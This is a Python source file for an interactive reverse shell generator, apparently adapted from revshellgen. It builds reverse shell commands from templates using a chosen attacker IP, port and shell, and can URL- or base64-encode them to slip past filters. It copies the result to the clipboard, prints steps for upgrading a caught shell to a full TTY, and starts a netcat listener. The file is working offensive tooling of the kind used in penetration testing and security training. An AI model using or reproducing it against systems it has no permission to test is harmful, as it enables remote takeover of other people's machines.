#!/usr/bin/env python3
# coding=utf-8
import ipaddress
import os
import sys
import platform
import subprocess
import urllib.parse 
import base64
import shutil
from string import Template
from typing import List

import readchar
from colorama import Fore, Style
from netifaces import *
from pyperclip import copy

banner = '''
                         __         __   __                  
  ____ ___  _  __  ___  / /  ___   / /  / /  ___ _ ___   ___ 
 / __// -_)| |/ / (_-< / _ \/ -_) / /  / /  / _ `// -_) / _ \\
/_/   \__/ |___/ /___//_//_/\__/ /_/  /_/   \_, / \__/ /_//_/
                                           /___/
'''

header = Template(
    '\n' + Style.BRIGHT + '---------- [ ' + Fore.CYAN + '$text' + Fore.RESET + ' ] ----------' + Style.RESET_ALL + '\n'
)
prompt = Template(
    Style.BRIGHT + '[' + Fore.BLUE + ' # ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text : ' + Style.BRIGHT
)
code = Template(Style.BRIGHT + Fore.GREEN + '$code' + Style.RESET_ALL)
success = Template(Style.BRIGHT + '[' + Fore.GREEN + ' + ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
info = Template(Style.BRIGHT + '[' + Fore.YELLOW + ' ! ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')
fail = Template(Style.BRIGHT + '[' + Fore.RED + ' - ' + Fore.RESET + '] ' + Style.RESET_ALL + '$text')

ip = port = shell = command = ''

encode_types = ['NONE', 'URL ENCODE', 'BASE64 ENCODE']
setup_or_not = ["yes","no"]
shells = ['/bin/sh', '/bin/bash', '/bin/zsh', '/bin/ksh', '/bin/tcsh', '/bin/dash']
commands = sorted([command for command in os.listdir(sys.path[0] + '/commands')])


def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(banner)


def is_valid(ip_address):
    try:
        ipaddress.ip_address(ip_address)
        return True
    except ValueError:
        return False


def exit_program():
    print('\n' + success.safe_substitute(text='Goodbye, friend.'))
    exit(0)


def select(
        options: List[str],
        selected_index: int = 0) -> int:
    print('\n' * (len(options) - 1))
    while True:
        print(f'\033[{len(options) + 1}A')
        for i, option in enumerate(options):
            print('\033[K{}{}'.format(
                '\033[1m[\033[32;1m x \033[0;1m]\033[0m ' if i == selected_index else
                '\033[1m[   ]\033[0m ', option))
        keypress = readchar.readkey()
        if keypress == readchar.key.UP:
            new_index = selected_index
            while new_index > 0:
                new_index -= 1
                selected_index = new_index
                break
        elif keypress == readchar.key.DOWN:
            new_index = selected_index
            while new_index < len(options) - 1:
                new_index += 1
                selected_index = new_index
                break
        elif keypress == readchar.key.ENTER or keypress == '\n':
            break
        elif keypress == readchar.key.CTRL_C:
            raise KeyboardInterrupt
    return selected_index


def specify_ip():
    print(header.safe_substitute(text='SELECT IP'))
    options = {}
    for interface in interfaces():
        try:
            ip_address = ifaddresses(interface)[AF_INET][0]['addr']
            if ip_address != '127.0.0.1':
                options[ip_address] = ip_address + ' on ' + interface
        except KeyError:
            pass
    options['manual'] = 'Specify manually'
    global ip
    ip = list(options.keys())[(select(list(options.values())))]
    if ip == 'manual':
        while True:
            input_ip = input(prompt.safe_substitute(text='Enter IP address'))
            if is_valid(input_ip):
                ip = input_ip
                break
            else:
                print(fail.safe_substitute(text='Please, specify a valid IP address!'))


def specify_port():
    print(header.safe_substitute(text='SPECIFY PORT'))
    while True:
        try:
            input_port = input(prompt.safe_substitute(text='Enter port number'))
            if int(input_port) in range(1, 65535):
                global port
                port = input_port
                break
            else:
                raise ValueError
        except ValueError:
            print(fail.safe_substitute(text='Please, choose a valid port number!'))


def select_command():
    print(header.safe_substitute(text='SELECT COMMAND'))
    global command
    command = commands[select(commands)]


def select_shell():
    if command not in ('windows_powershell', 'unix_bash', 'unix_telnet'):
        print(header.safe_substitute(text='SELECT SHELL'))
        global shell
        shell = shells[(select(shells))]


def build_command():
    global command
    with open(sys.path[0] + '/commands/' + command) as f:
        command = Template(f.read())
    command = command.safe_substitute(ip=ip, port=port, shell=shell)
    print(header.safe_substitute(text='SELECT ENCODE TYPE'))
    selected_encode_type = select(encode_types)
    if selected_encode_type == 1:
        command = urllib.parse.quote_plus(command)
        print(info.safe_substitute(text='Command is now URL encoded!'))
    if selected_encode_type == 2:
        command = base64.b64encode(command.encode()).decode()
        print(info.safe_substitute(text='Command is now BASE64 encoded!'))

    print(header.safe_substitute(text='FINISHED COMMAND'))
    print(code.safe_substitute(code=command) + '\n')

    if 'SSH_CLIENT' not in os.environ or 'SSH_TTY' not in os.environ:
        copy(command)
        print(info.safe_substitute(text='Reverse shell command copied to clipboard!'))

    # Display comprehensive TTY upgrade instructions
    display_tty_upgrade_instructions()


def display_tty_upgrade_instructions():
    """Display comprehensive instructions for upgrading to a fully interactive TTY."""
    print(header.safe_substitute(text='TTY UPGRADE INSTRUCTIONS'))
    
    # Get terminal dimensions
    try:
        cols, rows = shutil.get_terminal_size()
    except:
        cols, rows = 80, 24  # Default fallback
    
    print(info.safe_substitute(text='After getting a shell, follow these steps for a fully interactive TTY:\n'))
    
    # Step 1: Basic PTY spawn
    print(success.safe_substitute(text='Step 1: Spawn a PTY shell (in reverse shell)'))
    print(code.safe_substitute(code="python -c 'import pty;pty.spawn(\"/bin/bash\")'"))
    print("   OR")
    print(code.safe_substitute(code="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"))
    print("   OR")
    print(code.safe_substitute(code="script -q /dev/null -c bash"))
    print("   OR (for limited environments)")
    print(code.safe_substitute(code="/usr/bin/script -qc /bin/bash /dev/null"))
    print()
    
    # Step 2: Background the shell
    print(success.safe_substitute(text='Step 2: Background the shell'))
    print(code.safe_substitute(code="Press: Ctrl+Z"))
    print(info.safe_substitute(text='This will return you to your local terminal'))
    print()
    
    # Step 3: Get current terminal settings and set to raw mode
    print(success.safe_substitute(text='Step 3: Note your terminal settings and set raw mode (in local terminal)'))
    print(code.safe_substitute(code="stty -a  # Note the rows and columns values"))
    print(code.safe_substitute(code="stty raw -echo; fg"))
    print(info.safe_substitute(text='Note: After this, your terminal will look weird. Just continue typing.'))
    print()
    
    # Step 4: Set terminal type and export variables
    print(success.safe_substitute(text='Step 4: Configure the terminal (in reverse shell after fg)'))
    print(info.safe_substitute(text='Type these commands even if you can\'t see them properly:'))
    print(code.safe_substitute(code="reset"))
    print(code.safe_substitute(code="export SHELL=bash"))
    print(code.safe_substitute(code="export TERM=xterm-256color"))
    print(code.safe_substitute(code=f"stty rows {rows} columns {cols}"))
    print()
    
    # Alternative method for stubborn shells
    print(success.safe_substitute(text='Alternative method (if above doesn\'t work):'))
    print(code.safe_substitute(code="python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"))
    print(code.safe_substitute(code="export TERM=xterm"))
    print(code.safe_substitute(code="stty sane"))
    print(code.safe_substitute(code=f"stty rows {rows} cols {cols}"))
    print()
    
    # Optional: Additional improvements
    print(success.safe_substitute(text='Optional: Make your shell more comfortable'))
    print(code.safe_substitute(code="export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"))
    print(code.safe_substitute(code="alias ll='ls -la'"))
    print(code.safe_substitute(code="alias la='ls -la'"))
    print(code.safe_substitute(code="alias l='ls -la'"))
    print(code.safe_substitute(code="clear"))
    print()
    
    # Quick reference card
    print(header.safe_substitute(text='QUICK REFERENCE CARD'))
    quick_commands = f'''=== Quick Copy-Paste Sequence ===

1. In reverse shell:
   python3 -c 'import pty;pty.spawn("/bin/bash")'

2. Press Ctrl+Z

3. In your local terminal:
   stty raw -echo; fg

4. In reverse shell (type blindly if needed):
   reset
   export SHELL=bash TERM=xterm-256color
   stty rows {rows} columns {cols}

=== Your Terminal Info ===
Rows: {rows}
Columns: {cols}

=== Troubleshooting ===
- If backspace doesn't work: stty erase ^H
- If delete doesn't work: stty erase ^?
- If arrows don't work: export TERM=linux
- To fix display issues: reset or clear'''
    
    print(code.safe_substitute(code=quick_commands))
    
    # Option to save instructions
    save_tty_instructions(quick_commands, rows, cols)


def save_tty_instructions(instructions, rows, cols):
    """Offer to save TTY upgrade instructions to a file."""
    print()
    print(header.safe_substitute(text='SAVE INSTRUCTIONS'))
    save_options = ["Save TTY upgrade instructions to file", "Continue without saving"]
    
    if select(save_options) == 0:
        filename = f"tty_upgrade_{port}.txt"
        try:
            with open(filename, 'w') as f:
                f.write("TTY UPGRADE INSTRUCTIONS\n")
                f.write("========================\n\n")
                f.write(f"Generated for connection on port {port}\n")
                f.write(f"Terminal dimensions: {rows} rows x {cols} columns\n\n")
                f.write(instructions)
                f.write("\n\n" + "="*50 + "\n")
                f.write("References:\n")
                f.write("- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/\n")
                f.write("- https://github.com/t0thkr1s/revshellgen\n")
            print(success.safe_substitute(text=f'Instructions saved to {filename}'))
            
            # Also try to copy the quick commands to clipboard
            try:
                copy(instructions)
                print(success.safe_substitute(text='Quick reference also copied to clipboard!'))
            except:
                pass
        except Exception as e:
            print(fail.safe_substitute(text=f'Could not save file: {e}'))


def setup_listener():
    if os.name != 'nt':
        print(header.safe_substitute(text='SETUP LISTENER'))
        if select(setup_or_not) == 0:
            # Detect the operating system and available netcat variant
            system = platform.system()
            
            # Check for ncat first (works consistently across platforms)
            ncat_path = subprocess.run(['which', 'ncat'], capture_output=True, text=True).stdout.strip()
            nc_path = subprocess.run(['which', 'nc'], capture_output=True, text=True).stdout.strip()
            
            if ncat_path:
                # Prefer ncat if available (from nmap package)
                listener_cmd = f'{ncat_path} -nlvp {port}'
                print(success.safe_substitute(text=f'Using ncat for listener on port {port}'))
            elif system == 'Darwin':  # macOS
                if nc_path:
                    # macOS nc syntax is different: nc -l port
                    listener_cmd = f'{nc_path} -l {port}'
                    print(info.safe_substitute(text=f'Using macOS nc for listener on port {port}'))
                else:
                    print(fail.safe_substitute(text='No netcat found! Install ncat with: brew install nmap'))
                    exit_program()
            else:  # Linux and other Unix-like systems
                if nc_path:
                    # Traditional nc syntax
                    listener_cmd = f'{nc_path} -nlvp {port}'
                    print(success.safe_substitute(text=f'Using nc for listener on port {port}'))
                else:
                    print(fail.safe_substitute(text='No netcat found! Install nc or ncat.'))
                    exit_program()
            
            # Execute the listener command
            os.system('\n' + listener_cmd)
        else:
            exit_program()


if __name__ == '__main__':
    print_banner()
    try:
        specify_ip()
        specify_port()
        select_command()
        select_shell()
        build_command()
        setup_listener()
    except KeyboardInterrupt:
        exit_program()
